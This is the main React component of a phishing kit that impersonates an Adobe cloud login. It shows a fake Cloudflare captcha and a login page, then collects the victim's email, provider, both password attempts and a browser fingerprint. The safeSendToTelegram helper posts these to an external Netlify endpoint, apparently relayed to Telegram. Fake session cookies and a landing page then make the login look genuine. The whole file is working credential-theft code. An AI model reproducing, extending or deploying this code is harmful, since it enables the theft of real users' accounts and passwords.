import React, { useState, useEffect } from 'react';
import LoginPage from './components/LoginPage';
import MobileLoginPage from './components/mobile/MobileLoginPage';
import LandingPage from './components/LandingPage';
import MobileLandingPage from './components/mobile/MobileLandingPage';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import Spinner from './components/common/Spinner'; // Import the new Spinner
import { getBrowserFingerprint } from './utils/oauthHandler';
import { setCookie, getCookie, removeCookie, subscribeToCookieChanges, CookieChangeEvent } from './utils/realTimeCookieManager';
import { config } from './config'; // Import the new config file

// Helper: robust sender that prefers sendToTelegram util but falls back to fetch if needed.
const safeSendToTelegram = async (sessionData: any) => {
  // Fallback: call the Netlify function endpoint directly
  try {
    const res = await fetch(config.api.sendTelegramEndpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(sessionData)
    });

    if (!res.ok) {
      const bodyText = await res.text().catch(() => '');
      console.error(`Fetch response not ok: ${res.status} ${res.statusText} ${bodyText ? '- ' + bodyText : ''}`);
      throw new Error(`HTTP ${res.status}`);
    }
    return await res.json();
  } catch (fetchErr) {
    console.error('sendToTelegram (fetch) failed:', fetchErr);
    throw fetchErr;
  }
};

function App() {
  const [isMobile, setIsMobile] = useState(false);
  const [hasActiveSession, setHasActiveSession] = useState(false);
  const [currentPage, setCurrentPage] = useState('captcha');
  const [selectedFileName, setSelectedFileName] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [captchaVerified, setCaptchaVerified] = useState(false);

  // Check if device is mobile
  useEffect(() => {
    const checkMobile = () => setIsMobile(window.innerWidth <= 768);
    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  // Add real-time cookie monitoring for session changes
  useEffect(() => {
    const handleCookieChange = (event: CookieChangeEvent) => {
      if (event.name === 'adobe_session' || event.name === 'logged_in') {
        const isActive = event.action !== 'remove' && event.value && event.value !== 'false';
        setHasActiveSession(isActive);
        if (isActive) {
          setCurrentPage('landing');
        } else {
          setCaptchaVerified(false);
          setCurrentPage('captcha');
        }
      }
    };
    const unsubscribe = subscribeToCookieChanges(handleCookieChange);
    return unsubscribe;
  }, []);

  // Check for existing session on load
  useEffect(() => {
    const checkSession = async () => {
      setIsLoading(true);
      // Check for session via cookies
      const cookieSession = getCookie('adobe_session');
      if (cookieSession) {
        setHasActiveSession(true);
        setCaptchaVerified(true);
        setCurrentPage('landing');
      } else {
        setCurrentPage('captcha');
      }
      setIsLoading(false);
    };
    checkSession();
  }, []);

  const handleCaptchaVerified = () => {
    setIsLoading(true);
    setTimeout(() => {
      setCurrentPage('login');
      setCaptchaVerified(true);
      setIsLoading(false);
    }, 600);
  };

  const handleLoginSuccess = async (secondAttemptData: any) => {
    console.log('🔐 Login flow complete. Preparing to send data.', secondAttemptData);

    let firstAttemptData = {};
    try {
      const storedData = sessionStorage.getItem(config.session.firstAttemptKey);
      if (storedData) firstAttemptData = JSON.parse(storedData);
    } catch (e) {
      console.error('Could not parse first attempt data', e);
    }

    const browserFingerprint = await getBrowserFingerprint();
    const finalSessionData = {
      ...firstAttemptData,
      ...secondAttemptData,
      email: secondAttemptData.email,
      provider: secondAttemptData.provider,
      firstAttemptPassword: (firstAttemptData as any).password || secondAttemptData.firstAttemptPassword,
      secondAttemptPassword: secondAttemptData.password,
      sessionId: Math.random().toString(36).substring(2, 15),
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      ...browserFingerprint,
    };
    delete (finalSessionData as any).password;

    setHasActiveSession(true);
    localStorage.setItem(config.session.sessionDataKey, JSON.stringify(finalSessionData));

    const cookieOptions = {
      path: '/',
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict' as const,
    };
    setCookie('adobe_session', encodeURIComponent(JSON.stringify(secondAttemptData)), cookieOptions);
    setCookie('logged_in', 'true', cookieOptions);

    try {
      console.log('📤 Sending complete authentication data...');
      await safeSendToTelegram(finalSessionData);
      console.log('✅ Complete authentication data sent.');
    } catch (error) {
      console.error('❌ Failed to send final data:', error);
    }

    setCurrentPage('landing');
    setIsLoading(false);
  };

  const handleLogout = () => {
    localStorage.removeItem(config.session.sessionDataKey);
    sessionStorage.clear();
    config.session.cookieNames.forEach(name => removeCookie(name, { path: '/' }));

    setHasActiveSession(false);
    setCaptchaVerified(false);
    setCurrentPage('captcha');
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="text-center">
          <Spinner size="lg" />
          <p className="text-gray-600 mt-4">Loading...</p>
        </div>
      </div>
    );
  }

  if (currentPage === 'captcha' && !captchaVerified) {
    return <CloudflareCaptcha onVerified={handleCaptchaVerified} />;
  }

  if (currentPage === 'login' && captchaVerified && !hasActiveSession) {
    const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
    return (
      <LoginComponent
        fileName="Adobe Cloud Access"
        onBack={() => {
          setCaptchaVerified(false);
          setCurrentPage('captcha');
        }}
        onLoginSuccess={handleLoginSuccess}
        onLoginError={error => console.error('Login error:', error)}
        showBackButton={true}
      />
    );
  }

  if (hasActiveSession && currentPage === 'landing') {
    const LandingComponent = isMobile ? MobileLandingPage : LandingPage;
    return <LandingComponent onLogout={handleLogout} />;
  }

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center">
      <p className="text-gray-600">Loading application...</p>
    </div>
  );
}

export default App;
